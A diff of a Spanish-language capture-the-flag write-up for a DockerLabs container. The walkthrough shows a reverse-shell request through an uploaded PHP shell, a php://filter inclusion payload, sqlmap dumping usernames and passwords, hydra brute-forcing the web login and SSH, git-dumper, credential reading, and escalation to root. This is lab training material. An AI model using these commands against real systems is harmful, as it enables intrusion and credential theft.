@@ -1,4 +1,4 @@
-### Report-DockerLabs🇪🇸
+<img width="975" height="89" alt="image" src="https://github.com/user-attachments/assets/3e6ed6cc-c95d-4e4c-90df-b35db785e8e1" /><img width="962" height="538" alt="image" src="https://github.com/user-attachments/assets/d1c4568f-1b65-4b97-b2dd-d91645b96d7c" />### Report-DockerLabs🇪🇸
 
 #### 1. Primero encendemos el laboratorio
 ```bash
@@ -133,8 +133,7 @@ http://realgob.dl/uploads/cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/t
 
 #### 9.2 En la terminal
 ```bash
-nc -lvnp 4444
-```
+T```
 
 <img width="861" height="799" alt="image" src="https://github.com/user-attachments/assets/cc77c88e-2304-4f08-9060-a94f9f6a392c" />
 
@@ -256,4 +255,145 @@ http://realgob.dl/about.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|con
 <img width="776" height="539" alt="image" src="https://github.com/user-attachments/assets/78f0aba7-44e1-43c4-af77-cb1e29f373f3" />
 
 
-#### 10.2 
+#### 10.2 Lo guardamos como request.txt
+
+<img width="901" height="331" alt="image" src="https://github.com/user-attachments/assets/5d4dd244-75b1-4c1f-90d9-41211064e20b" />
+
+#### 11. Realizaremos un sqlmap para que automaticamente pruebe a explotar la base de datos.
+```bash
+ sqlmap -r request.txt --level=5 --risk=3 --dbs --batch
+```
+
+<img width="973" height="540" alt="image" src="https://github.com/user-attachments/assets/8a8bcb66-6526-435d-96ae-57d682ec6609" />
+
+
+#### 11.2 Sabiendo que se puede explotar vamos a listar todas las tablas de la base de datos para ver si emplea la misma que la web.
+```bash
+sqlmap -r request.txt --level=5 --risk=3 -D GOB_BD --tables --batch
+```
+
+<img width="959" height="540" alt="image" src="https://github.com/user-attachments/assets/04f22735-adff-48c4-9d70-08e047fb1f4b" />
+
+
+#### 11.3 Vamos a ver ahora las columnas de users.
+```bash
+sqlmap -r request.txt --level=5 --risk=3 -D GOB_BD -T users --columns --batch
+```
+
+<img width="969" height="528" alt="image" src="https://github.com/user-attachments/assets/caa230b3-34b2-4649-b60d-d1a2aa459894" />
+
+
+#### 11.4 Ahora vamos a conseguir los usuarios con sus contraseñas.
+```bash
+sqlmap -r request.txt --level=5 --risk=3 -D GOB_BD -T users -C username,password --dump --batch
+```
+
+<img width="960" height="534" alt="image" src="https://github.com/user-attachments/assets/b487999b-49c5-40a5-86a0-0e679150550b" />
+
+
+#### 11.5 Ahora sabiendo los usuarios y ver que en /logs la password qwerty realizamos hydra para confirmar.
+```bash
+
+└─$ hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -p qwerty realgob.dl http-post-form "/login.php:username=^USER^&password=^PASS^:encontrado" 
+```
+
+<img width="972" height="388" alt="image" src="https://github.com/user-attachments/assets/a2239862-b3ab-492f-ad12-7022b30a5cec" />
+
+
+#### 11.6 Vamos a realizar un gobuster para ver en el /desarrollo.
+```bash
+gobuster dir -u "http://realgob.dl/desarrollo/" -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200  
+```
+
+<img width="961" height="535" alt="image" src="https://github.com/user-attachments/assets/4081bac3-178c-4ca2-a805-dcf640c784ca" />
+
+
+#### 11.7 Instalamog gitdump para ver todos los ficheros y lo utilizamos
+```bash
+git clone https://github.com/arthaud/git-dumper
+cd git-dumper
+python3 -m venv venv
+source venv/bin/activate.fish
+pip3 install -r requirements.txt
+python3 git_dumper.py http://realgob.dl/desarrollo/.git/ dump    
+```
+
+<img width="962" height="538" alt="image" src="https://github.com/user-attachments/assets/6e1f84a1-315e-4c6f-aa1f-d6417f97631a" />
+
+
+#### 11.8 Vamos a ver todo lo encontrado.
+```bash
+cd dump/
+ ls -la
+```
+
+<img width="971" height="315" alt="image" src="https://github.com/user-attachments/assets/487d3a58-cc78-41a1-86cd-bb07c5950b51" />
+
+
+#### 12. Ahora leemos la password y el user para el ssh.
+```bash
+cat password.txt 
+cat php_version_update_log.txt
+ cat remote_management_log.txt 
+```
+
+<img width="974" height="457" alt="image" src="https://github.com/user-attachments/assets/0ebad2fe-8197-4ecd-96b5-2d3cfa683c3e" />
+
+
+#### 13. Creamos un txt con las posibles contraseñas y usuarios y probamos mediante hydra.
+```bash
+hydra -L users.txt -P password.txt ssh://172.17.0.2 -t 64 -I
+```
+
+<img width="968" height="255" alt="image" src="https://github.com/user-attachments/assets/1800aef0-6093-4c7c-9e2f-b9c12283f996" />
+
+
+#### 14. Entramos mediante ssh
+```bash
+ssh adm@172.17.0.2
+```
+
+<img width="960" height="336" alt="image" src="https://github.com/user-attachments/assets/2a6d28a3-d8b3-4a70-833f-7947ca1b8cac" />
+
+
+#### 15. Vamos a ver que usarios tienen alguna terminal enlazada.
+```bash
+cat /etc/passwd | grep sh$
+```
+
+<img width="827" height="112" alt="image" src="https://github.com/user-attachments/assets/90fe610e-c1d0-4d80-86b4-8e818f492a1b" />
+
+
+#### 15.2 Ahora vamos a ir a /tmp y leemos el único archivo que podemos leer y encontramos las creedenciales de la base de datos.
+```bash
+cat /var/www/html/config.php
+```
+
+<img width="763" height="266" alt="image" src="https://github.com/user-attachments/assets/9451db52-e24b-40d6-ab49-952639f7b865" />
+
+
+#### 15.3 Vamos a revisar todas las variables de enterno, en env encontramos un password cifrado.
+```bash
+env
+```
+
+<img width="958" height="541" alt="image" src="https://github.com/user-attachments/assets/37588fe9-b33d-4425-87a6-4240b4ebd14d" />
+
+
+#### 15.4 La desciframos en hexadecimal.
+```bash
+echo "64 6f 63 6b 65 72 6c 61 62 73 34 75" | xxd -r -p
+```
+
+<img width="975" height="98" alt="image" src="https://github.com/user-attachments/assets/cdbd10aa-f344-495a-ac05-f5955cd384d4" />
+
+
+#### 16. Ascendemos mediante su y la contraseña.
+```bash
+su
+```
+
+<img width="968" height="134" alt="image" src="https://github.com/user-attachments/assets/ddb59bfd-ab48-4c34-8ae0-f346cc8a3d42" />
+
+
+
